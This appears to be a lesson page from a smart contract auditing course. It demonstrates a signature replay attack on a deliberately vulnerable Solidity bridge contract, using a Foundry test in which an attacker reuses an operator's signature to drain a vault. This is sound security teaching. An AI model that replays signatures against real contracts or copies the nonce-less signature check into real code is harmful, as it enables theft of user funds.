---
title: Signature Replay PoC
---

_Follow along with the video lesson:_

---

### Signature Replay PoC

With some context of how a signature replay attack works, we can come back to our sendToL1 function within L1BossBridge.sol and see how it applies to our situation.

```js
function sendToL1(uint8 v, bytes32 r, bytes32 s, bytes memory message) public nonReentrant whenNotPaused {
    address signer = ECDSA.recover(MessageHashUtils.toEthSignedMessageHash(keccak256(message)), v, r, s);

    if (!signers[signer]) {
        revert L1BossBridge__Unauthorized();
    }

    (address target, uint256 value, bytes memory data) = abi.decode(message, (address, uint256, bytes));

    (bool success,) = target.call{ value: value }(data);
    if (!success) {
        revert L1BossBridge__CallFailed();
    }
}
```

We can see that there's clearly nothing in place to prevent this broadcast signature from being used more than once. We should write a proof of code to demonstrate this.

Within L1TokenBridge.t.sol:

```js
function testSignatureReplay() public {
address attacker = makeAddr("attacker");
// assume the vault already holds some tokens
uint256 vaultInitialBalance = 1000e18;
uint256 attackerInitialBalance = 100e18;
deal(address(token), address(vault), vaultInitialBalance);
deal(address(token), attacker, attackerInitialBalance);

// An attacker deposits tokens to L2
vm.startPrank(attacker);
token.approve(address(tokenBridge), type(uint256).max);
tokenBridge.depositTokensToL2(attacker, attacker, attackerInitialBalance);

// Signer/Operator is going to sign the withdrawal
bytes memory message = abi.encode(
    address(token), 0, abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, attackerInitialBalance))
);

(uint8 v, bytes32 r, bytes32 s) = vm.sign(operator.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));

while(token.balanceOf(address(vault)) > 0){
    tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
}

assertEq(token.balanceOf(attacker), attackerInitialBalance + vaultInitialBalance);
assertEq(token.balanceOf(address(vault)), 0);
}
```

Ok, this is a lot of code, let's break down what's happening here so far. We first set up our environment by creating an `attacker` address and assigning some value of our token to both the `attacker` and the `vault`.

```js
address attacker = makeAddr("attacker");
// assume the vault already holds some tokens
uint256 vaultInitialBalance = 1000e18;
uint256 attackerInitialBalance = 100e18;
deal(address(token), address(vault), vaultInitialBalance);
deal(address(token), attacker, attackerInitialBalance);
```

Next, our `attacker` is depositing some tokens into the vault via `depositTokensToL2`.

```js
// An attacker deposits tokens to L2
vm.startPrank(attacker);
token.approve(address(tokenBridge), type(uint256).max);
tokenBridge.depositTokensToL2(attacker, attacker, attackerInitialBalance);
```

At this point our deposit has been emitted and the off-chain `signer` is now meant to sign the withdraw transaction. The first step to this is hashing the message to be signed.

```js
bytes memory message = abi.encode(
address(token), 0, abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, attackerInitialBalance))
);
```

We're going to leverage some Foundry magic by using the Cheatcode `vm.sign` to simulate this signature. We need to pass `vm.sign` a private key and a message. Fortunately, Foundry can help us again.

We're very familiar with the creation of addresses in our Foundry tests, but something we've not really touched on is the creation of accounts. At the very top of `L1TokenBridge.t.sol`, you can see we have an example.

```js
address deployer = makeAddr("deployer");
address user = makeAddr("user");
address userInL2 = makeAddr("userInL2");
Account operator = makeAccount("operator");
```

Our `operator` variable is an example of an Account object. These objects have 2 properties, `key` and `addr`. Let's use `operator.key` to sign our withdraw transaction.

```js
(uint8 v, bytes32 r, bytes32 s) = vm.sign(operator.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
```

> **Remember:** We're using MessageHashUtils here to format our message data to the EIP standard!

When our operator signs a legitimate withdraw message, their signature components (v, r, and s) are available on-chain as a product of the functions being called in Boss Bridge. This means our attacker can use these values to execute the transaction over and over again maliciously.

```js
while (token.balanceOf(address(vault)) > 0) {
  tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
}

assertEq(
  token.balanceOf(attacker),
  attackerInitialBalance + vaultInitialBalance
);
assertEq(token.balanceOf(address(vault)), 0);
```

Ok, let's run it and see how Boss Bridge responds to our signature replay attack.

```bash
forge test --mt testSignatureReplay --vvv
```

![signature-replay-poc1](/security-section-7/27-signature-replay-poc/signature-replay-poc1.png)

### Wrap Up

Our test for signature replay passed. For such a small code base, we're sure finding a lot of highs...

Again, I'm going to skip generating a write up for this finding, but your homework is to challenge yourself to write one. You can find an example to compare yours to in the [**audit-data branch**](https://github.com/Cyfrin/7-boss-bridge-audit/blob/audit-data/audit-data/2023-09-01-boss-bridge-audit.md) of this lesson's repo.

In the next lesson, we'll learn just how simple it is to protect against signature replay attacks.
